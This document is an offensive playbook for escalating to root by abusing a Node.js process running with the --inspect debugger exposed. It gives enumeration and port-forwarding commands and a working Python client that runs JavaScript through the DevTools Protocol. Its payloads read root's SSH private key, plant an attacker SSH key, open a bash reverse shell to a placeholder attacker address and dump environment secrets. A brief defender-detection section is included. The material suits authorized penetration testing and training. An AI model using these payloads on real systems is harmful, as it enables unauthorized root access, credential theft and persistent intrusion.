# Node.js `--inspect` / Chrome DevTools Protocol Abuse

## When this applies

- A higher-privileged Node.js process (often root, sometimes a setuid wrapper) runs with the V8 Inspector enabled. Fingerprints:
  - `ps auxfww` shows `--inspect`, `--inspect-brk`, or `--inspect-port=` in the command line.
  - `ss -tlnp` shows a `node` process listening on **9229** (default) or any port bound to `127.0.0.1` after the flag.
  - The process was started via `NODE_OPTIONS=--inspect …` in a systemd unit or supervisor config.
- You have an unprivileged shell that can reach the inspector port (locally or via a port-forward).
- **No credentials, tokens, or auth** are required. The Inspector trusts every connection.

## Why it works

`node --inspect=HOST:PORT` opens an HTTP+WebSocket interface exposing the **Chrome DevTools Protocol (CDP)**. CDP includes `Runtime.evaluate`, which compiles and runs arbitrary JavaScript inside the target process — full access to `process`, `require`, `child_process`, the heap, and the filesystem under that process's UID.

Even when the inspector is bound to `127.0.0.1` (the default), any local user — including the web app's service account post-RCE — can connect. The classic chain is **web RCE as `node`/`www-data` → tunnel/connect to root-owned `--inspect` → RCE as root**.

## Steps

1. **Locate the inspector port and process owner.**

   ```bash
   ss -tlnp 2>/dev/null | grep -E '9229|inspect'
   ps -eo user,pid,cmd | grep -E 'node.*--inspect' | grep -v grep
   # Each --inspect process has exactly one debugger session
   ```

2. **If you need to reach it from outside the box**, port-forward over your existing SSH:

   ```bash
   ssh -f -N -L 9229:127.0.0.1:9229 <user>@<TARGET_IP>
   ```

   Or from a web-RCE foothold, `socat TCP-LISTEN:19229,fork TCP:127.0.0.1:9229` and pivot.

3. **Enumerate sessions.** The inspector publishes its WebSocket URL via the HTTP discovery endpoint:

   ```bash
   curl -s http://127.0.0.1:9229/json | jq .
   # Capture .webSocketDebuggerUrl — looks like ws://127.0.0.1:9229/<uuid>
   ```

   The session ID rotates per process restart, so always re-read `/json` rather than hard-coding.

4. **Execute JS via `Runtime.evaluate`.** Minimal Python client:

   ```python
   import asyncio, json, urllib.request, websockets

   async def cdp_eval(expr):
       sess = json.loads(urllib.request.urlopen("http://127.0.0.1:9229/json").read())[0]
       async with websockets.connect(sess["webSocketDebuggerUrl"], max_size=8<<20) as ws:
           await ws.send(json.dumps({"id": 1, "method": "Runtime.enable"}))
           await ws.send(json.dumps({"id": 2, "method": "Runtime.evaluate",
               "params": {"expression": expr, "returnByValue": True, "awaitPromise": True}}))
           while True:
               d = json.loads(await ws.recv())
               if d.get("id") == 2:
                   return d.get("result", {}).get("result", {})

   print(asyncio.run(cdp_eval(
       "process.mainModule.require('child_process').execSync('id').toString()"
   )))
   ```

5. **Common payloads.**

   ```js
   // Read any file under the target process's UID
   require('fs').readFileSync('/root/.ssh/id_rsa', 'utf8')

   // Shell — synchronous
   require('child_process').execSync('cat /root/root.txt').toString()

   // Drop an SSH key, then exit the inspector cleanly
   require('fs').appendFileSync('/root/.ssh/authorized_keys', '<attacker-pub-key>\n')

   // Reverse shell — async, won't block the host event loop
   require('child_process').exec('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"')
   ```

6. **Persistence (optional).** `process.env` and `process.argv` reveal startup secrets that were never written to disk (DB URIs, JWT signing keys). Dumping them in one call lets the rest of the engagement run without the inspector.

## Detection signatures (for the defender writeup)

- `ss -tlnp` listening on 9229 (or any `node --inspect` port).
- `/proc/<pid>/cmdline` containing `--inspect`.
- `auditd` rule on `connect()` to localhost:9229 from any non-`node`-spawned process.

## Anti-Patterns

- Connecting from a browser DevTools — works, but leaves a session lock that may collide with the legitimate developer. Prefer programmatic CDP.
- Using `Debugger.evaluateOnCallFrame` — requires a paused execution context; `Runtime.evaluate` works against a live runtime with no breakpoint.
- Hard-coding `webSocketDebuggerUrl` — the UUID changes per process restart; always GET `/json` first.
